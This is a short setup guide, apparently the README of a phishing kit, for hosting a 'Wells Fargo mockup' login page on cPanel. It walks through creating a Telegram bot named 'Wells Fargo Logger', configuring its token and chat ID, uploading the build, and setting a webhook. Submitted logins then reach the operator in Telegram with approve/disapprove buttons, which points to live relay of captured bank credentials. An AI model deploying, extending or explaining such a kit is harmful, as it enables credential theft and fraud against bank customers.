# 🏠 Quick cPanel Setup Guide

## 📋 What You Need

- cPanel hosting account
- Telegram account
- 5-10 minutes

## 🚀 Step-by-Step Setup

### 1️⃣ Create Telegram Bot

1. **Open Telegram** → Search `@BotFather`
2. **Send** `/start` then `/newbot`
3. **Choose name**: "Wells Fargo Logger" (or any name)
4. **Choose username**: "wellsfargo_logger_bot" (must end with 'bot')
5. **Copy the token** (looks like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`)

### 2️⃣ Get Your Chat ID

1. **Send any message** to your new bot
2. **Open browser** → Visit:
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```
   Replace `<YOUR_BOT_TOKEN>` with your actual token
3. **Find** `"chat":{"id":` in the response
4. **Copy the number** after `"id":` (like: `123456789`)

### 3️⃣ Configure App

1. **Open** `src/config/cpanel-config.js`
2. **Replace**:
   ```javascript
   TELEGRAM_BOT_TOKEN: "YOUR_BOT_TOKEN_HERE", // Paste your token here
   TELEGRAM_CHAT_ID: "YOUR_CHAT_ID_HERE",     // Paste your chat ID here
   ```

### 4️⃣ Build for cPanel

```bash
npm run build:cpanel
```

### 5️⃣ Upload to cPanel

1. **Login** to cPanel
2. **Open** File Manager
3. **Go to** `public_html` folder
4. **Upload** ALL files from the `out` folder
   - ⚠️ Upload the **contents** of `out`, not the folder itself

### 6️⃣ Set Up Webhook (Required for Admin Approval)

After uploading files:

1. **Visit** `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook?url=https://yourdomain.com/api/telegram-webhook`
2. **Replace** `<YOUR_BOT_TOKEN>` with your actual token
3. **Replace** `yourdomain.com` with your actual domain
4. **You should see** `{"ok":true,"result":true,"description":"Webhook was set"}`

### 7️⃣ Test

- **Visit** your domain
- **Fill** the login form
- **Check** your Telegram for approval request with buttons
- **Click** "Approve" or "Disapprove"
- **User** gets redirected or sees error message

## ❓ Troubleshooting

### Bot Not Sending Messages?

- ✅ Check if you sent `/start` to your bot
- ✅ Verify token format: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`
- ✅ Verify chat ID is a number: `123456789`
- ✅ Check browser console (F12) for errors

### Can't Find Chat ID?

**Alternative method**:

1. Add bot to a group
2. Send message in group
3. Check getUpdates URL again
4. Look for negative chat ID (group ID)

### Files Not Uploading?

- ✅ Make sure you're uploading to `public_html`
- ✅ Upload **contents** of `out` folder, not the folder itself
- ✅ Check file permissions (should be 644 for files, 755 for folders)

## 📞 Need Help?

Check the full `DEPLOYMENT.md` guide for detailed instructions and more hosting options.

---

**🎉 That's it! Your Wells Fargo mockup is now live on cPanel!**
